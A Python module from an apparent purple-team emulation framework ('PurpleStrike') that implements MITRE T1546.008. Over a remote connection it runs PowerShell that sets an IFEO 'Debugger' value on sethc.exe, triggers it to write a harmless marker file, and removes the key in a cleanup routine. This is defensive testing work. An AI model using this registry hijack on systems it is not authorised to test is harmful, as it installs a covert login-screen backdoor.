from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)
_created_targets: set[str] = set()

_IFEO_KEY = (
    "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
    "Image File Execution Options\\sethc.exe"
)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Hijack sethc.exe through IFEO and trigger a benign marker command."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        setup_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            f"if (Test-Path -LiteralPath '{_IFEO_KEY}') {{ "
            "throw 'Existing sethc.exe IFEO configuration will not be overwritten' }; "
            f"New-Item -Path '{_IFEO_KEY}' -Force | Out-Null; "
            f"New-ItemProperty -Path '{_IFEO_KEY}' -Name 'Debugger' "
            "-PropertyType String -Value 'cmd.exe /d /c \"echo "
            "PurpleStrike-T1546.008>C:\\Windows\\Temp\\purplestrike_sethc.txt\"' "
            "-ErrorAction Stop | Out-Null"
        )
        setup = await conn.run_ps(setup_cmd)
        if not setup.success:
            raise RuntimeError(setup.stderr or setup.stdout or "Accessibility IFEO setup failed")
        _created_targets.add(target)
        result = await conn.run_ps(
            "$ErrorActionPreference = 'Stop'; "
            "$marker = 'C:\\Windows\\Temp\\purplestrike_sethc.txt'; "
            "[IO.File]::Delete($marker); "
            "Start-Process -FilePath 'C:\\Windows\\System32\\sethc.exe' -Wait; "
            "for ($i=0; $i -lt 20 -and !(Test-Path -LiteralPath $marker); $i++) "
            "{ Start-Sleep -Milliseconds 250 }; "
            "Get-Content -LiteralPath $marker -ErrorAction Stop"
        )
        return TechniqueResult(
            technique_id="T1546.008",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
            artifacts=["C:\\Windows\\Temp\\purplestrike_sethc.txt"],
            evidence=["The sethc.exe IFEO debugger executed and wrote its marker."],
        )
    except Exception as e:
        logger.error(f"T1546.008 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.008",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        if target not in _created_targets:
            return
        conn = await get_connection(target)
        cleanup_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            f"Remove-Item -LiteralPath '{_IFEO_KEY}' -Recurse -Force "
            "-ErrorAction SilentlyContinue; "
            "Remove-Item -LiteralPath 'C:\\Windows\\Temp\\purplestrike_sethc.txt' "
            "-Force -ErrorAction SilentlyContinue"
        )
        removed = await conn.run_ps(cleanup_cmd)
        if not removed.success:
            raise RuntimeError(removed.stderr or removed.stdout or "Accessibility cleanup failed")
        _created_targets.discard(target)
    except Exception as e:
        logger.warning(f"T1546.008 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
